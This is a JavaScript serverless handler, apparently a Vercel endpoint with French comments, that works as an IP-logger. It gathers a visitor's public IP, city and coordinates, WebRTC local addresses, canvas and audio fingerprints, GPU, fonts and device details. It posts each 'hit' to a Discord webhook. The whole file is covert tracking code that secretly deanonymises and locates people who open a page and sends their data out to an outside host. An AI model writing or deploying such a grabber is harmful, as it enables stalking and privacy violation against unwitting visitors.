export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({error:'method'});
  
  const d = req.body || {};
  
  // IP publique
  const publicIP = (req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'inconnu').split(',')[0].trim();
  
  // === Headers serveur enrichis (TLS / Client Hints / Vercel geo) ===
  const serverInfo = {
    ip: publicIP,
    country: req.headers['x-vercel-ip-country'] || 'n/a',
    region: req.headers['x-vercel-ip-country-region'] || 'n/a',
    city: req.headers['x-vercel-ip-city'] ? decodeURIComponent(req.headers['x-vercel-ip-city']) : 'n/a',
    latitude: req.headers['x-vercel-ip-latitude'] || 'n/a',
    longitude: req.headers['x-vercel-ip-longitude'] || 'n/a',
    timezone: req.headers['x-vercel-ip-timezone'] || 'n/a',
    asn: req.headers['x-vercel-ip-as-number'] || 'n/a',
    // Client Hints HTTP (surtout Android/Chrome)
    chModel: req.headers['sec-ch-ua-model'] || 'n/a',
    chPlatform: req.headers['sec-ch-ua-platform'] || 'n/a',
    chPlatformVersion: req.headers['sec-ch-ua-platform-version'] || 'n/a',
    chFullVersion: req.headers['sec-ch-ua-full-version-list'] || 'n/a',
    chMobile: req.headers['sec-ch-ua-mobile'] || 'n/a',
    chArch: req.headers['sec-ch-ua-arch'] || 'n/a',
    chBitness: req.headers['sec-ch-ua-bitness'] || 'n/a',
    acceptLanguage: req.headers['accept-language'] || 'n/a',
    acceptEncoding: req.headers['accept-encoding'] || 'n/a'
  };

  const embed = {
    title: "🎯 NOUVEAU HIT",
    color: 0xff3333,
    fields: [
      { name: "📱 APPAREIL DEVINÉ", value: `**${d.deviceGuess || 'inconnu'}**`, inline: false },
      { name: "🌐 IP publique + Geo", value: `\`${publicIP}\` (${serverInfo.city}, ${serverInfo.region}, ${serverInfo.country}) ASN: ${serverInfo.asn}`, inline: false },
      { name: "🏠 WebRTC (IP/mDNS)", value: `\`${(d.webrtc || []).join(', ') || 'aucune'}\``, inline: false },
      { name: "🔐 Fingerprint custom (stable)", value: `\`${d.customFingerprint}\``, inline: false },
      { name: "🎨 Canvas", value: `\`${(d.canvasFP||'').substring(0,30)}\``, inline: true },
      { name: "🔊 Audio FP", value: `\`${d.audioFP}\``, inline: true },
      { name: "🖼️ Refresh rate", value: `${d.refreshRate} Hz`, inline: true },
      { name: "🎮 GPU", value: `\`${d.gpu?.renderer || 'n/a'}\``, inline: false },
      { name: "🧪 WebGPU", value: d.webgpu?.available ? `vendor:${d.webgpu.vendor} arch:${d.webgpu.architecture}` : 'non dispo', inline: false },
      { name: "⏱️ GPU bench (ms)", value: `${d.gpuBench || 'n/a'}`, inline: true },
      { name: "🎬 Codecs", value: `AV1:${d.codecs?.av1} H265:${d.codecs?.h265Main}`, inline: false },
      { name: "📐 Écran logique / physique", value: `${d.screen} / ${d.screenPhysical}`, inline: false },
      { name: "🌍 Fuseau / Langue", value: `${d.timezone} / ${d.language}`, inline: true },
      { name: "⚙️ CPU / RAM", value: `${d.hardwareConcurrency} cores / ${d.deviceMemory}`, inline: true },
      { name: "👆 Touch / Capteurs", value: `${d.touchPoints} pts / motion:${d.sensors?.motion}`, inline: true },
      { name: "🔤 Polices détectées", value: `\`${(d.fonts || []).join(', ').substring(0,250) || 'n/a'}\``, inline: false },
      { name: "🎨 CSS features", value: `\`${(d.cssFeatures || []).join(', ').substring(0,200) || 'n/a'}\``, inline: false },
      { name: "📡 Client Hints (Android surtout)", value: `model:\`${serverInfo.chModel}\` platform:\`${serverInfo.chPlatform}\` v:\`${serverInfo.chPlatformVersion}\``, inline: false },
      { name: "⏱️ Perf.now precision", value: `${d.timings?.performanceNowPrecision} (iOS ~1ms / Chrome ~µs)`, inline: true },
      { name: "📱 User-Agent", value: `\`${(d.userAgent||'').substring(0,300)}\``, inline: false },
      { name: "🕐 Timestamp", value: d.timestamp || 'n/a', inline: false }
    ],
    footer: { text: "Famille Secu" }
  };

  try {
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ embeds:[embed] })
    });
  } catch(e) { console.error(e); }

  res.status(200).json({ ok: true });
}
